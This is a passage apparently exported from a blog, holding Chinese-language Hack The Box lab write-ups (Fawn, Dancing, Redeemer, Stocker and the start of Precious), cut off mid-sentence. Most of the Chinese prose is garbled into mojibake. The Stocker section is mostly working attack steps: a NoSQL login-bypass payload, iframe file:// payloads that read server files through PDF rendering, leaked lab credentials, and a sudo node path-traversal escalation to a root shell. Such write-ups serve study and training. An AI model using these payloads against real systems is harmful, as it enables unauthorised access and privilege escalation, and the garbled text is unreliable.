è¿æ¥æˆåŠŸï¼Œæ‹¿åˆ°shellï¼Œæ‰¾flag\n\n\nFawné¶æœº1ï¼‰vpnè¿æ¥ï¼Œä¸åšå±•ç¤ºäº†\n2ï¼‰åˆ›å»ºå®ä¾‹æ‹¿åˆ°ip\n\n3ï¼‰æ¥ä¸‹æ¥å‡ ä¸ªé—®ç­”é¢˜ \n1.What does the 3-letter acronym FTP stand for?ï¼ˆFTPæ˜¯ä»€ä¹ˆçš„ç®€ç§°ï¼Ÿï¼‰\nFile Transfer Protocol\n2.Which port is the FTP service active on usually?ï¼ˆé€šå¸¸æƒ…å†µä¸‹ï¼ŒFTPæ´»è·ƒåœ¨å“ªä¸ªç«¯å£ï¼Ÿï¼‰\n21 tcp\n3.What acronym is used for the secure version of FTP?ï¼ˆå®‰å…¨ç‰ˆæœ¬çš„FTPçš„ç®€ç§°æ˜¯ä»€ä¹ˆï¼Ÿï¼‰\nsftp\n4.What is the command we can use to send an ICMP echo request to test our connection to the target?\nping\n5.From your scans, what version is FTP running on the target?ï¼ˆæ ¹æ®ä½ çš„æ‰«æï¼Œç›®æ ‡ä¸Šè¿è¡Œçš„FTPæ˜¯ä»€ä¹ˆç‰ˆæœ¬?ï¼‰\n-sV æ¢æµ‹æœåŠ¡&#x2F;ç‰ˆæœ¬ä¿¡æ¯ æˆ‘ä»¬å¯ä»¥çœ‹åˆ° å¼€æ”¾21ç«¯å£çš„ftpåè®® ç‰ˆæœ¬æ˜¯ vsftpd 3.0.3\n\n6.From your scans, what OS type is running on the target? \nUnix\n7.What is the command we need to run in order to display the â€˜ftpâ€™ client help menu?ï¼ˆä¸ºäº†æ˜¾ç¤ºâ€œftpâ€å®¢æˆ·ç«¯å¸®åŠ©èœå•ï¼Œæˆ‘ä»¬éœ€è¦è¿è¡Œä»€ä¹ˆå‘½ä»¤?ï¼‰\nftp -h\n8.What is username that is used over FTP when you want to log in without having an account? \nFTPæ²¡æœ‰è´¦æˆ·æ—¶å€™æˆ‘ä»¬å¯ä»¥ç”¨username: anonymous é‡‡ç”¨åŒ¿åè®¿é—®;\n9.What is the response code we get for the FTP message â€˜Login successfulâ€™? \n230\n\nFTPçŠ¶æ€ç \n\n### 1xx\n\n*è‚¯å®šçš„åˆæ­¥ç­”å¤ï¼Œè¿™äº›çŠ¶æ€ä»£ç æŒ‡ç¤ºä¸€é¡¹æ“ä½œå·²ç»æˆåŠŸå¼€å§‹ï¼Œä½†å®¢æˆ·ç«¯å¸Œæœ›åœ¨ç»§ç»­æ“ä½œæ–°å‘½ä»¤å‰å¾—åˆ°å¦ä¸€ä¸ªç­”å¤ã€‚*\n\n- 110 é‡æ–°å¯åŠ¨æ ‡è®°ç­”å¤ã€‚\n- 120 æœåŠ¡å·²å°±ç»ªï¼Œåœ¨ nnn åˆ†é’Ÿåå¼€å§‹ã€‚\n- 125 æ•°æ®è¿æ¥å·²æ‰“å¼€ï¼Œæ­£åœ¨å¼€å§‹ä¼ è¾“ã€‚\n- 150 æ–‡ä»¶çŠ¶æ€æ­£å¸¸ï¼Œå‡†å¤‡æ‰“å¼€æ•°æ®è¿æ¥ã€‚\n\n### 2xx\n\n*è‚¯å®šçš„å®Œæˆç­”å¤ï¼Œä¸€é¡¹æ“ä½œå·²ç»æˆåŠŸå®Œæˆã€‚å®¢æˆ·ç«¯å¯ä»¥æ‰§è¡Œæ–°å‘½ä»¤ã€‚*\n\n- 200 å‘½ä»¤ç¡®å®šã€‚\n- 202 æœªæ‰§è¡Œå‘½ä»¤ï¼Œç«™ç‚¹ä¸Šçš„å‘½ä»¤è¿‡å¤šã€‚\n- 211 ç³»ç»ŸçŠ¶æ€ï¼Œæˆ–ç³»ç»Ÿå¸®åŠ©ç­”å¤ã€‚\n- 212 ç›®å½•çŠ¶æ€ã€‚\n- 213 æ–‡ä»¶çŠ¶æ€ã€‚\n- 214 å¸®åŠ©æ¶ˆæ¯ã€‚\n- 215 NAME ç³»ç»Ÿç±»å‹ï¼Œå…¶ä¸­ï¼ŒNAME æ˜¯ Assigned Numbers æ–‡æ¡£ä¸­æ‰€åˆ—çš„æ­£å¼ç³»ç»Ÿåç§°ã€‚\n- 220 æœåŠ¡å°±ç»ªï¼Œå¯ä»¥æ‰§è¡Œæ–°ç”¨æˆ·çš„è¯·æ±‚ã€‚\n- 221 æœåŠ¡å…³é—­æ§åˆ¶è¿æ¥ã€‚å¦‚æœé€‚å½“ï¼Œè¯·æ³¨é”€ã€‚\n- 225 æ•°æ®è¿æ¥æ‰“å¼€ï¼Œæ²¡æœ‰è¿›è¡Œä¸­çš„ä¼ è¾“ã€‚\n- 226 å…³é—­æ•°æ®è¿æ¥ã€‚è¯·æ±‚çš„æ–‡ä»¶æ“ä½œå·²æˆåŠŸï¼ˆä¾‹å¦‚ï¼Œä¼ è¾“æ–‡ä»¶æˆ–æ”¾å¼ƒæ–‡ä»¶ï¼‰ã€‚\n- 227 è¿›å…¥è¢«åŠ¨æ¨¡å¼ (h1,h2,h3,h4,p1,p2)ã€‚\n- 230 ç”¨æˆ·å·²ç™»å½•ï¼Œç»§ç»­è¿›è¡Œã€‚\n- 250 è¯·æ±‚çš„æ–‡ä»¶æ“ä½œæ­£ç¡®ï¼Œå·²å®Œæˆã€‚\n- 257 å·²åˆ›å»ºâ€œPATHNAMEâ€ã€‚\n\n### 3xx\n\n*è‚¯å®šçš„ä¸­é—´ç­”å¤ï¼Œè¯¥å‘½ä»¤å·²æˆåŠŸï¼Œä½†æœåŠ¡å™¨éœ€è¦æ›´å¤šæ¥è‡ªå®¢æˆ·ç«¯çš„ä¿¡æ¯ä»¥å®Œæˆå¯¹è¯·æ±‚çš„å¤„ç†ã€‚*\n\n- 331 ç”¨æˆ·åæ­£ç¡®ï¼Œéœ€è¦å¯†ç ã€‚\n- 332 éœ€è¦ç™»å½•å¸æˆ·ã€‚\n- 350 è¯·æ±‚çš„æ–‡ä»¶æ“ä½œæ­£åœ¨ç­‰å¾…è¿›ä¸€æ­¥çš„ä¿¡æ¯ã€‚\n\n### 4xx\n\n*ç¬æ€å¦å®šçš„å®Œæˆç­”å¤ï¼Œè¯¥å‘½ä»¤ä¸æˆåŠŸï¼Œä½†é”™è¯¯æ˜¯æš‚æ—¶çš„ã€‚å¦‚æœå®¢æˆ·ç«¯é‡è¯•å‘½ä»¤ï¼Œå¯èƒ½ä¼šæ‰§è¡ŒæˆåŠŸã€‚*\n\n- 421 æœåŠ¡ä¸å¯ç”¨ï¼Œæ­£åœ¨å…³é—­æ§åˆ¶è¿æ¥ã€‚å¦‚æœæœåŠ¡ç¡®å®šå®ƒå¿…é¡»å…³é—­ï¼Œå°†å‘ä»»ä½•å‘½ä»¤å‘é€è¿™ä¸€åº”ç­”ã€‚\n- 425 æ— æ³•æ‰“å¼€æ•°æ®è¿æ¥ã€‚\n- 426 Connection closed; transfer aborted.\n- 450 æœªæ‰§è¡Œè¯·æ±‚çš„æ–‡ä»¶æ“ä½œã€‚æ–‡ä»¶ä¸å¯ç”¨ï¼ˆä¾‹å¦‚ï¼Œæ–‡ä»¶ç¹å¿™ï¼‰ã€‚\n- 451 è¯·æ±‚çš„æ“ä½œå¼‚å¸¸ç»ˆæ­¢ï¼šæ­£åœ¨å¤„ç†æœ¬åœ°é”™è¯¯ã€‚\n- 452 æœªæ‰§è¡Œè¯·æ±‚çš„æ“ä½œã€‚ç³»ç»Ÿå­˜å‚¨ç©ºé—´ä¸å¤Ÿã€‚\n\n## 5xx\n\n*æ°¸ä¹…æ€§å¦å®šçš„å®Œæˆç­”å¤ï¼Œè¯¥å‘½ä»¤ä¸æˆåŠŸï¼Œé”™è¯¯æ˜¯æ°¸ä¹…æ€§çš„ã€‚å¦‚æœå®¢æˆ·ç«¯é‡è¯•å‘½ä»¤ï¼Œå°†å†æ¬¡å‡ºç°åŒæ ·çš„é”™è¯¯ã€‚*\n\n- 500 è¯­æ³•é”™è¯¯ï¼Œå‘½ä»¤æ— æ³•è¯†åˆ«ã€‚è¿™å¯èƒ½åŒ…æ‹¬è¯¸å¦‚å‘½ä»¤è¡Œå¤ªé•¿ä¹‹ç±»çš„é”™è¯¯ã€‚\n- 501 åœ¨å‚æ•°ä¸­æœ‰è¯­æ³•é”™è¯¯ã€‚\n- 502 æœªæ‰§è¡Œå‘½ä»¤ã€‚\n- 503 é”™è¯¯çš„å‘½ä»¤åºåˆ—ã€‚\n- 504 æœªæ‰§è¡Œè¯¥å‚æ•°çš„å‘½ä»¤ã€‚\n- 530 æœªç™»å½•ã€‚\n- 532 å­˜å‚¨æ–‡ä»¶éœ€è¦å¸æˆ·ã€‚\n- 550 æœªæ‰§è¡Œè¯·æ±‚çš„æ“ä½œã€‚æ–‡ä»¶ä¸å¯ç”¨ï¼ˆä¾‹å¦‚ï¼Œæœªæ‰¾åˆ°æ–‡ä»¶ï¼Œæ²¡æœ‰è®¿é—®æƒé™ï¼‰ã€‚\n- 551 è¯·æ±‚çš„æ“ä½œå¼‚å¸¸ç»ˆæ­¢ï¼šæœªçŸ¥çš„é¡µé¢ç±»å‹ã€‚\n- 552 è¯·æ±‚çš„æ–‡ä»¶æ“ä½œå¼‚å¸¸ç»ˆæ­¢ï¼šè¶…å‡ºå­˜å‚¨åˆ†é…ï¼ˆå¯¹äºå½“å‰ç›®å½•æˆ–æ•°æ®é›†ï¼‰ã€‚\n- 553 æœªæ‰§è¡Œè¯·æ±‚çš„æ“ä½œã€‚ä¸å…è®¸çš„æ–‡ä»¶åã€‚\n\n## 6xx\n\n- 600 Seriesï¼ŒReplies regarding confidentiality and integrity\n- 631 Integrity protected reply.\n- 632 Confidentiality and integrity protected reply.\n- 633 Confidentiality protected reply.\n\n\n\n10.There are a couple of commands we can use to list the files and directories available on the FTP server. One is dir. What is the other that is a common way to list files on a Linux system. \nls\n11.What is the command used to download the file we found on the FTP server? \nget\nä¸‹è½½æ–‡ä»¶é€šå¸¸ç”¨getå’Œmgetè¿™ä¸¤æ¡å‘½ä»¤ã€‚\n a) get \n æ ¼å¼ï¼šget [remote-file] [local-file]\n å°†æ–‡ä»¶ä»è¿œç«¯ä¸»æœºä¸­ä¼ é€è‡³æœ¬åœ°ä¸»æœºä¸­ã€‚\n å¦‚è¦è·å–è¿œç¨‹æœåŠ¡å™¨ä¸Š/usr/your/1.htmï¼Œåˆ™\n\nftp&gt; get /usr/your/1.htm 1.htm (å›è½¦)\n\n b) mgetã€€ã€€ã€€ã€€ã€€ã€€\n æ ¼å¼ï¼šmget [remote-files]\n ä»è¿œç«¯ä¸»æœºæ¥æ”¶ä¸€æ‰¹æ–‡ä»¶è‡³æœ¬åœ°ä¸»æœºã€‚\n å¦‚è¦è·å–æœåŠ¡å™¨ä¸Š/usr/your/ä¸‹çš„æ‰€æœ‰æ–‡ä»¶ï¼Œåˆ™\n\nftp&gt; cd /usr/your/\n ftp&gt; mget *.* (å›è½¦)\n\n æ­¤æ—¶æ¯ä¸‹è½½ä¸€ä¸ªæ–‡ä»¶ï¼Œéƒ½ä¼šæœ‰æç¤ºã€‚å¦‚æœè¦é™¤æ‰æç¤ºï¼Œåˆ™åœ¨mget *.* å‘½ä»¤å‰å…ˆæ‰§è¡Œ:prompt off\n\n12.è·å–flag,ftpè¿æ¥\n\næ‹¿åˆ°flag\nDancingé¶æœºè¿æ¥vpn,åˆ›å»ºå®ä¾‹\n1.What does the 3-letter acronym SMB stand for?ï¼ˆSMBæ˜¯ä»€ä¹ˆçš„ç®€ç§°ï¼Ÿï¼‰\nServer Message Block\n2.What port does SMB use to operate at?ï¼ˆç”¨ä»€ä¹ˆç«¯å£å»æ“ä½œSMB?ï¼‰\n445\n3.What is the service name for port 445 that came up in our nmap scan?ï¼ˆä»æ‰«æç»“æœæ¥çœ‹ï¼Œ445ç«¯å£çš„æœåŠ¡åç§°æ˜¯ä»€ä¹ˆï¼Ÿï¼‰\nmicrosoft-ds\n4.What is the flag or switch we can use with the SMB tool to list the contents of the share?ï¼ˆæˆ‘ä»¬å¯ä»¥ç”¨SMBå·¥å…·å“ªä¸ªâ€œæ ‡è¯†â€æˆ–è€…â€œå¼€å…³â€æ¥åˆ—ä¸¾å‡ºåˆ†äº«çš„æ–‡ä»¶ï¼Ÿï¼‰\n-L\n5.How many shares are there on Dancing? \n6.What is the name of the share we are able to access in the end with a blank password?\nWorkShares\n7.What is the command we can use within the SMB shell to download the files we find? \nget\nnmapç«¯å£æ‰«æ\n\nå¼€æ”¾äº†3ä¸ªæœåŠ¡135: msrpc ï¼ˆMicroSoft Remote Procedure Callï¼Œå¾®è½¯è¿œç¨‹è¿‡ç¨‹è°ƒç”¨ï¼‰ è¿™æ˜¯windosç³»ç»Ÿç‰¹æœ‰çš„æœåŠ¡139:netbios-ssn ç”¨äºæä¾›æ–‡ä»¶å…±äº«æœåŠ¡,ä¸»è¦ç”¨äºä¼ä¸šå†…éƒ¨ç½‘ä¹‹é—´äº’ç›¸è®¿é—® ä¹Ÿæ˜¯å¾®è½¯çš„æœåŠ¡445:å°±æ˜¯æˆ‘ä»¬è¯´çš„SMB\nsmbè¿æ¥\n\nè®¿é—®WorkSharesï¼Œæ‰¾åˆ°flag.txtï¼Œgetåˆ°æœ¬åœ°æŸ¥çœ‹\n\nRedeemeré¶æœºå¸¸è§„è¿æ¥vpn,åˆ›å»ºå®ä¾‹\n\nnmapæ‰«æ\n\nå¾—åˆ°redis ç‰ˆæœ¬å·5.0.7\nç”¨redis-cliè¿æ¥\ninfoçœ‹åˆ°æœ‰å››ä¸ªé”®\n\nkeys * \n\nå¾—åˆ°flag\n1.Which TCP port is open on the machine?\n6379\n2.Which service is running on the port that is open on the machine?\nredis\n3.What type of database is Redis? Choose from the following options: (i) In-memory Database, (ii) Traditional Database\nIn-memory Database\n4.Which command-line utility is used to interact with the Redis server? Enter the program name you would enter into the terminal without any arguments.\nredis-cli\n5.Which flag is used with the Redis command-line utility to specify the hostname?\n-h\n6.Once connected to a Redis server, which command is used to obtain the information and statistics about the Redis server?\ninfo\n7.What is the version of the Redis server being used on the target machine?\n5.0.7\n8.Which command is used to select the desired database in Redis?ï¼ˆåœ¨Redisä¸­ä½¿ç”¨å“ªä¸ªå‘½ä»¤æ¥é€‰æ‹©æ‰€éœ€çš„æ•°æ®åº“?ï¼‰\nselect\n9.How many keys are present inside the database with index 0?\n4\n10.Which command is used to obtain all the keys in a database?ï¼ˆè·å–æ•°æ®åº“ä¸­æ‰€æœ‰å¯†é’¥çš„å‘½ä»¤æ˜¯ä»€ä¹ˆ?ï¼‰\n**keys ***\næ€»ç»“è¿™ä¸ªTIER0,ä¸»è¦å°±æ˜¯è®©æˆ‘ä»¬äº†è§£Telnetã€ftpã€SMBã€Redisè¿™äº›æœåŠ¡ï¼Œåé¢è¿˜æœ‰å››ä¸ªé¶æœºåˆ†åˆ«ä¸ºRDPï¼šç”¨xfreerdp æ¥è¿æ¥ã€ç›®å½•çˆ†ç ´ï¼šç”¨gobusteræ¥çˆ†ç ´ã€ MongoDBã€Rsyncï¼Œåé¢å››ä¸ªé¶æœºéœ€è¦vipï¼Œä¸è¿‡ä¹Ÿå¾ˆç®€å•ï¼Œæ²¡å¿…è¦æ‰“ã€‚\n","tags":["æ‰“é¶","HTB","æ¸—é€æµ‹è¯•"]},{"title":"HTB-easy Machinesç³»åˆ—","url":"/2023/02/12/HTB-easy%20Machines%E7%B3%BB%E5%88%97/","content":"Stockernmapæ‰«æâ”Œâ”€â”€(rootğŸ’€kali)-[~]\nâ””â”€# nmap -sV 10.10.11.196\nStarting Nmap 7.91 ( https://nmap.org ) at 2023-02-10 20:53 EST\nNmap scan report for stocker.htb (10.10.11.196)\nHost is up (2.1s latency).\nNot shown: 998 closed ports\nPORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)\n80/tcp open  http    nginx 1.18.0 (Ubuntu)\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 26.41 seconds\n\n\n\ncurlå‘ç°80ç«¯å£çš„åŸŸå\nâ””â”€# curl 10.10.11.196 --head\nHTTP/1.1 301 Moved Permanently\nServer: nginx/1.18.0 (Ubuntu)\nDate: Sat, 11 Feb 2023 02:21:56 GMT\nContent-Type: text/html\nContent-Length: 178\nConnection: keep-alive\nLocation: http://stocker.htb\n\nåœ¨&#x2F;etc&#x2F;hostsä¸­æ·»åŠ ï¼Œè®¿é—®ç½‘é¡µï¼Œæ²¡ä»€ä¹ˆæœ‰ç”¨ä¿¡æ¯\nå­åŸŸåæšä¸¾å·¥å…·å¾ˆå¤šï¼Œåªæœ‰å­—å…¸é€‰å¾—å¥½å°±è¡Œäº†ï¼Œæˆ‘è¿™é‡Œä½¿ç”¨äº†kaliçš„å­—å…¸é›†seclistsä¸‹çš„å­åŸŸåçˆ†ç ´å­—å…¸ã€‚\nâ”Œâ”€â”€(rootğŸ’€kali)-[~]\nâ””â”€# ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u http://FUZZ.stocker.htb\n\n        /&#39;___\\  /&#39;___\\           /&#39;___\\       \n       /\\ \\__/ /\\ \\__/  __  __  /\\ \\__/       \n       \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\      \n        \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/      \n         \\ \\_\\   \\ \\_\\  \\ \\____/  \\ \\_\\       \n          \\/_/    \\/_/   \\/___/    \\/_/       \n\n       v1.5.0 Kali Exclusive &lt;3\n________________________________________________\n\n :: Method           : GET\n :: URL              : http://FUZZ.stocker.htb\n :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt\n :: Follow redirects : false\n :: Calibration      : false\n :: Timeout          : 10\n :: Threads          : 40\n :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500\n________________________________________________\n\ndev                     [Status: 302, Size: 28, Words: 4, Lines: 1, Duration: 953ms]\n\nçˆ†å‡ºdevå­åŸŸåï¼Œæ·»åŠ åˆ°etc&#x2F;hostsæ–‡ä»¶ï¼Œè®¿é—®ï¼Œæ˜¯ä¸ªç™»å½•çª—å£ï¼Œéšæ„è¾“å…¥æŠ“ä¸ªåŒ…çœ‹çœ‹\nNOsqlæ³¨å…¥ç›¸å…³é“¾æ¥\nrequst\nPOST /login HTTP/1.1\n\nHost: dev.stocker.htb\n\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0\n\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8\n\nAccept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2\n\nAccept-Encoding: gzip, deflate\n\nContent-Type: application/x-www-form-urlencoded\n\nContent-Length: 29\n\nOrigin: http://dev.stocker.htb\n\nConnection: close\n\nReferer: http://dev.stocker.htb/login\n\nCookie: connect.sid=s%3AFWIdQ3-xL3iYmpJqnfHYkkn1fz-VC_0m.W10CYIEr6Dtiy%2Bg8VuESaTI84n6lEd17mWNsaYNDFn0\n\nUpgrade-Insecure-Requests: 1\n\n\n\nusername=admin&amp;password=admin\n\nrespose\nHTTP/1.1 302 Found\n\nServer: nginx/1.18.0 (Ubuntu)\n\nDate: Sat, 11 Feb 2023 02:16:13 GMT\n\nContent-Type: text/html; charset=utf-8\n\nContent-Length: 92\n\nConnection: close\n\nX-Powered-By: Express\n\nLocation: /login?error=login-error\n\nVary: Accept\n\n\n\n&lt;p&gt;Found. Redirecting to &lt;a href=&quot;/login?error=login-error&quot;&gt;/login?error=login-error&lt;/a&gt;&lt;/p&gt;\n\nä½¿ç”¨bpæŠ“åŒ…ï¼Œå°†ç™»å½•å‚æ•°æ”¹ä¸ºjsonä»£ç ï¼ŒåŒæ—¶å°†Content-Typeéšä¹‹æ›´æ”¹\nrequst\nPOST /login HTTP/1.1\n\nHost: dev.stocker.htb\n\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0\n\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8\n\nAccept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2\n\nAccept-Encoding: gzip, deflate\n\nContent-Type: application/json\n\nContent-Length: 55\n\nOrigin: http://dev.stocker.htb\n\nConnection: close\n\nReferer: http://dev.stocker.htb/login\n\nCookie: connect.sid=s%3AFWIdQ3-xL3iYmpJqnfHYkkn1fz-VC_0m.W10CYIEr6Dtiy%2Bg8VuESaTI84n6lEd17mWNsaYNDFn0\n\nUpgrade-Insecure-Requests: 1\n\n\n\n&#123;&quot;username&quot;: &#123;&quot;$ne&quot;: null&#125;, &quot;password&quot;: &#123;&quot;$ne&quot;: null&#125; &#125;\n\nrespose\nHTTP/1.1 302 Found\n\nServer: nginx/1.18.0 (Ubuntu)\n\nDate: Sat, 11 Feb 2023 02:55:44 GMT\n\nContent-Type: text/html; charset=utf-8\n\nContent-Length: 56\n\nConnection: close\n\nX-Powered-By: Express\n\nLocation: /stock\n\nVary: Accept\n\nSet-Cookie: connect.sid=s%3AQBv56UBK59KlhesFqTHFoMs8cz_xJDRs.nXEOSd52fW7zT2Ojs4Hn%2Bu9oiUmKPEaSjWk8VKjTbyc; Path=/; HttpOnly\n\n\n\n&lt;p&gt;Found. Redirecting to &lt;a href=&quot;/stock&quot;&gt;/stock&lt;/a&gt;&lt;/p&gt;\n\né‡å®šå‘åˆ°äº†&#x2F;stocké¡µé¢ï¼Œåœ¨æµè§ˆå™¨ä¸­æŸ¥çœ‹\n\næ˜¯ä¸ªè´­ç‰©ç½‘ç«™ï¼Œç®€å•èµ°ä¸€ä¸‹æµç¨‹ï¼Œé€‰è´­å¥½ä¸œè¥¿åï¼Œç‚¹view cartæäº¤è´¦å•åï¼Œå¼¹å‡ºä»¥ä¸‹ç•Œé¢\n\næ˜¾ç¤ºorderIDå’Œä¸€ä¸ªè¶…é“¾æ¥ï¼Œç‚¹å‡»ï¼Œä¼šå®šä½åˆ°&#x2F;api&#x2F;po&#x2F;orderID,åŒæ—¶æ˜¾ç¤ºæ‰€è´­ä¹°çš„å•†å“\n\næŠ“åŒ…æŸ¥çœ‹å…·ä½“æ•°æ®åŒ…\nPOST /api/order HTTP/1.1\n\nHost: dev.stocker.htb\n\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0\n\nAccept: */*\n\nAccept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2\n\nAccept-Encoding: gzip, deflate\n\nReferer: http://dev.stocker.htb/stock\n\nContent-Type: application/json\n\nOrigin: http://dev.stocker.htb\n\nContent-Length: 162\n\nConnection: close\n\nCookie: connect.sid=s%3AXCU2j-Ge2IfqK8UyCTbeoP3b5cXEsFDl.tML7SoE%2BTzG8r0FHxV8l66ypAgjazZEBEreIW5GClLw\n\n\n\n&#123;&quot;basket&quot;:[&#123;&quot;_id&quot;:&quot;638f116eeb060210cbd83a8d&quot;,&quot;title&quot;:&quot;Cup&quot;,&quot;description&quot;:&quot;It&#39;s a red cup.&quot;,&quot;image&quot;:&quot;red-cup.jpg&quot;,&quot;price&quot;:32,&quot;currentStock&quot;:4,&quot;__v&quot;:0,&quot;amount&quot;:1&#125;]&#125;\n\nHTTP/1.1 200 OK\n\nServer: nginx/1.18.0 (Ubuntu)\n\nDate: Sat, 11 Feb 2023 03:08:25 GMT\n\nContent-Type: application/json; charset=utf-8\n\nContent-Length: 53\n\nConnection: close\n\nX-Powered-By: Express\n\nETag: W/&quot;35-U3nSPD6OYldWF6R+73GibB6cpYA&quot;\n\n\n\n&#123;&quot;success&quot;:true,&quot;orderId&quot;:&quot;63e706a93bf31dab4f32ab3c&quot;&#125;\n\nä»æ•°æ®åŒ…å¯ä»¥çœ‹ç‚¹requstä¸­jsonæ•°æ®ä¸­çš„titleä¼šåœ¨ç½‘é¡µå›æ˜¾ï¼Œè€Œresponseä¸­çš„orderIdä¼šåœ¨urlä¸­æ˜¾ç¤ºã€‚è¿™é‡Œå¤§æ¦‚ç‡å¯ä»¥åˆ©ç”¨æœ¬åœ°æ–‡ä»¶åŒ…å«ã€‚\næœ¬åœ°æ–‡ä»¶åŒ…å«å°†jsonä¸­çš„titleæ•°æ®æ›´æ”¹ä¸ºï¼šâ€titleâ€: â€œ&lt;iframe src&#x3D;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd height:750px width: 750px&gt;â€œ\n\nå›æ˜¾æˆåŠŸï¼Œè¿™æ—¶å€™æˆ‘ä»¬å¯ä»¥å»è¯»æºç è·å–æœ‰ç”¨ä¿¡æ¯\nåˆ©ç”¨wappalyzerå¾—åˆ°ç¼–ç¨‹è¯­è¨€ä¸ºnodeï¼Œé‚£ä¹ˆå°±åº”è¯¥å»è¯»å–index.js\n\nå°†titleæ•°æ®æ”¹ä¸º â€œtitleâ€: â€œ&lt;iframe src&#x3D;file:&#x2F;&#x2F;&#x2F;var&#x2F;www&#x2F;dev&#x2F;index.js height:10000px width: 8000px&gt;â€œ\n\næˆ‘ä»¬å¯ä»¥çœ‹åˆ° index.js æ–‡ä»¶çš„å…¶ä¸­ä¸€è¡Œè¿æ¥åˆ° mongodbï¼Œå¹¶ä¸”å¯†ç ä»¥æ˜æ–‡å½¢å¼æ˜¾ç¤ºã€‚å¯ä»¥å°è¯•ä½¿ç”¨è·å¾—çš„å‡­æ® ssh è¿›å…¥æœåŠ¡å™¨\nangoose:IHeardPassphrasesArePrettySecure\n-bash-5.0$ pwd\n/home/angoose\n-bash-5.0$ ls -a\n.  ..  .bash_history  .bash_logout  .bashrc  .cache  .mongodb  n3ym4r.js  .profile  user.txt  .viminfo\n-bash-5.0$ cat user.txt\nd750aa79aa54e49f0c4fd0b58c495a68\n\næ‹¿åˆ°user flag\nææƒæ‰§è¡Œâ€œsudo -lâ€ï¼Œå¯ä»¥çœ‹åˆ°å¦‚æœæˆ‘ä»¬æ‰§è¡Œâ€œ.jsâ€ç±»å‹çš„æ–‡ä»¶ï¼Œå°±èƒ½ç«‹å³è·å¾— root è®¿é—®æƒé™\né‚£ä¹ˆåˆ›å»ºä¸€ä¸ª.jsæ–‡ä»¶\nè¿™é‡Œè·¯å¾„æ˜¯æ€ä¹ˆå¾—å‡ºçš„å‘¢ Linuxç³»ç»Ÿä¸‹&#x2F;home å’Œ&#x2F;usrä¸ºåŒçº§ç›®å½•è¦ä»usrè½¬åˆ°homeéœ€è¦å¾€å›ä¸‰æ¬¡\n-bash-5.0$ vim n3ym4r.js\n-bash-5.0$ cat n3ym4r.js\nrequire(&quot;child_process&quot;).spawn(&quot;/usr/bin/bash&quot;, &#123;stdio:[0, 1, 2]&#125;)\n-bash-5.0$ sudo /usr/bin/node /usr/local/scripts/../../../home/angoose/n3ym4r.js\n\nroot@stocker:/home/angoose# whoami\nroot\nroot@stocker:/home/angoose# ls\nn3ym4r.js  user.txt\nroot@stocker:/home/angoose# cd ~\nroot@stocker:~# ls\nroot.txt\nroot@stocker:~# cat root.txt\n8ed1a75f8d894c3b51070771dfe4ca67\nroot@stocker:~# \n\næ‹¿åˆ°root flag\nPreciousnmapæ‰«æâ”Œâ”€â”€(rootğŸ’€kali)-[~]\nâ””â”€# nmap -sC -sV 10.10.11.189\nStarting Nmap 7.91 ( https://nmap.org ) at 2023-02-11 06:56 EST\nNmap scan report for precious.htb (10.10.11.189)\nHost is up (1.4s latency).\nNot shown: 998 closed ports\nPORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)\n| ssh-hostkey: \n|   3072 84:5e:13:a8:e3:1e:20:66:1d:23:55:50:f6:30:47:d2 (RSA)\n|   256 a2:ef:7b:96:65:ce:41:61:c4:67:ee:4e:96:c7:c8:92 (ECDSA)\n|_  256 33:05:3d:cd:7a:b7:98:45:82:39:e7:ae:3c:91:a6:58 (ED25519)\n80/tcp open  http    nginx 1.18.0\n| http-server-header: \n|   nginx/1.18.0\n|_  nginx/1.18.0 + Phusion Passenger(R) 6.0.15\n|_http-title: Convert Web Page to PDF\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 38.91 seconds\n\nNmap æ˜¾ç¤º 80 å’Œ 22 ç«¯å£å·²æ‰“å¼€ï¼Œ80 ç«¯å£å°†æˆ‘ä»¬é‡å®šå‘åˆ° precious.htb\nå°†å…¶æ·»åŠ åˆ° /etc/hosts æ–‡ä»¶ä¸­\nwebæ¼æ´å‘ç°è®¿é—®é¡µé¢ï¼Œç½‘ç«™åŠŸèƒ½ä¸ºå°†è¾“å…¥çš„urlè½¬æ¢ä¸ºpdf\n\næœ¬åœ°èµ·ä¸ªwebæœåŠ¡\nâ”Œâ”€â”€(rootğŸ’€kali)-[~]\nâ””â”€# python3 -m http.server 80\n\nç½‘é¡µè¾“å…¥æˆ‘ä»¬æœ¬æœºipï¼Œå¦‚æˆ‘ä»¬æ‰€æƒ³ç”Ÿæˆäº†ä¸€ä¸ªpdf\n\nF12\n\nçœ‹åˆ°pdfç‰ˆæœ¬ä¸ºpdfkit 